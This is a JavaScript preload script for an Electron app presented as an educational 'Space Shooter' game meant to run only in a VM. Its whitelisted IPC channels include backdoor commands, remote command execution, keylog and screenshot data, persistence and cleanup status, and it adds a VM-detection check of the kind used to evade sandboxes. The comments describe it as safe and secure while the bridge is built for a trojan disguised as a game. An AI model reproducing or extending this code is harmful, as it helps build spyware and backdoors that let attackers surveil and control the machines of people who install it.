const { contextBridge, ipcRenderer } = require('electron');

/**
 * Space Shooter - Preload Script
 * Educational Project - VM Only
 * 
 * This script safely exposes Electron IPC methods to the renderer process
 * All channels are strictly whitelisted for security
 */

// Valid IPC channels for sending messages (renderer -> main)
const validSendChannels = [
    'game-started',
    'game-over',
    'backdoor-request',
    'toggle-pause',
    'system-info',
    'command-output',
    'log-message'
];

// Valid IPC channels for receiving messages (main -> renderer)
const validReceiveChannels = [
    'os-info',
    'backdoor-command',
    'toggle-pause',
    'screenshot-data',
    'keylog-data',
    'persistence-status',
    'cleanup-status',
    'command-result',
    'system-status'
];

// Valid invoke channels (promise-based communication)
const validInvokeChannels = [
    'get-system-info',
    'execute-command',
    'check-dependencies',
    'get-version',
    'get-persistence-status'
];

/**
 * Safe wrapper for IPC communication
 * Prevents renderer from sending arbitrary IPC messages
 */
contextBridge.exposeInMainWorld('electronAPI', {
    // Send one-way messages to main (fire-and-forget)
    send: (channel, data) => {
        if (validSendChannels.includes(channel)) {
            ipcRenderer.send(channel, data);
        } else {
            console.warn(`Blocked invalid send channel: ${channel}`);
        }
    },
    
    // Receive messages from main (with automatic cleanup)
    receive: (channel, func) => {
        if (validReceiveChannels.includes(channel)) {
            // Strip event object to prevent prototype pollution
            const subscription = (event, ...args) => func(...args);
            ipcRenderer.on(channel, subscription);
            
            // Return cleanup function
            return () => {
                ipcRenderer.removeListener(channel, subscription);
            };
        } else {
            console.warn(`Blocked invalid receive channel: ${channel}`);
            return () => {};
        }
    },
    
    // Invoke (promise-based) communication with main
    invoke: async (channel, data) => {
        if (validInvokeChannels.includes(channel)) {
            try {
                return await ipcRenderer.invoke(channel, data);
            } catch (error) {
                console.error(`Error invoking ${channel}:`, error);
                throw error;
            }
        } else {
            console.warn(`Blocked invalid invoke channel: ${channel}`);
            throw new Error(`Invalid channel: ${channel}`);
        }
    },
    
    // Remove all listeners for a channel
    removeAllListeners: (channel) => {
        if (validReceiveChannels.includes(channel)) {
            ipcRenderer.removeAllListeners(channel);
        }
    },
    
    // Check if a channel is available
    hasChannel: (channel, type = 'send') => {
        if (type === 'send') return validSendChannels.includes(channel);
        if (type === 'receive') return validReceiveChannels.includes(channel);
        if (type === 'invoke') return validInvokeChannels.includes(channel);
        return false;
    },
    
    // Get all available channels (for debugging)
    getChannels: () => ({
        send: [...validSendChannels],
        receive: [...validReceiveChannels],
        invoke: [...validInvokeChannels]
    })
});

/**
 * Expose system information safely
 * This runs in the preload context, so we can access Node.js modules
 */
contextBridge.exposeInMainWorld('systemInfo', {
    getPlatform: () => process.platform,
    getArch: () => process.arch,
    getVersions: () => ({ ...process.versions }),
    getEnvironment: () => ({
        isDevelopment: process.env.NODE_ENV === 'development',
        isProduction: process.env.NODE_ENV === 'production',
        electronVersion: process.versions.electron,
        chromeVersion: process.versions.chrome,
        nodeVersion: process.versions.node
    }),
    isVM: () => {
        // Simple VM detection
        const platform = process.platform;
        const cpus = require('os').cpus();
        const totalMem = require('os').totalmem();
        
        return {
            suspected: cpus.length <= 2 || totalMem < 4 * 1024 * 1024 * 1024,
            cpuCores: cpus.length,
            memoryGB: (totalMem / (1024 * 1024 * 1024)).toFixed(2)
        };
    }
});

/**
 * Expose safe file system operations
 * Limited to specific directories for security
 */
contextBridge.exposeInMainWorld('fileSystem', {
    readFile: async (filePath) => {
        // Only allow reading from temp or user data
        const allowedPaths = [
            require('os').tmpdir(),
            require('electron').app.getPath('userData')
        ];
        
        const isAllowed = allowedPaths.some(allowed => 
            filePath.startsWith(allowed)
        );
        
        if (!isAllowed) {
            throw new Error('Access denied: File path not allowed');
        }
        
        return await ipcRenderer.invoke('read-file', filePath);
    },
    
    writeFile: async (filePath, data) => {
        // Only allow writing to temp or user data
        const allowedPaths = [
            require('os').tmpdir(),
            require('electron').app.getPath('userData')
        ];
        
        const isAllowed = allowedPaths.some(allowed => 
            filePath.startsWith(allowed)
        );
        
        if (!isAllowed) {
            throw new Error('Access denied: File path not allowed');
        }
        
        return await ipcRenderer.invoke('write-file', { path: filePath, data });
    },
    
    getTempDir: () => require('os').tmpdir(),
    getUserDataDir: () => require('electron').app.getPath('userData')
});

/**
 * Logging utility for debugging
 */
contextBridge.exposeInMainWorld('logger', {
    info: (message) => ipcRenderer.send('log-message', { level: 'info', message }),
    warn: (message) => ipcRenderer.send('log-message', { level: 'warn', message }),
    error: (message) => ipcRenderer.send('log-message', { level: 'error', message }),
    debug: (message) => {
        if (process.env.NODE_ENV === 'development') {
            ipcRenderer.send('log-message', { level: 'debug', message });
        }
    }
});

/**
 * App version info
 */
contextBridge.exposeInMainWorld('appInfo', {
    getVersion: () => ipcRenderer.invoke('get-version'),
    getName: () => 'Space Shooter',
    isEducational: true,
    requiresVM: true
});

// Log successful preload
console.log('✅ Preload script loaded successfully');
console.log('📡 Available channels:', {
    send: validSendChannels,
    receive: validReceiveChannels,
    invoke: validInvokeChannels
});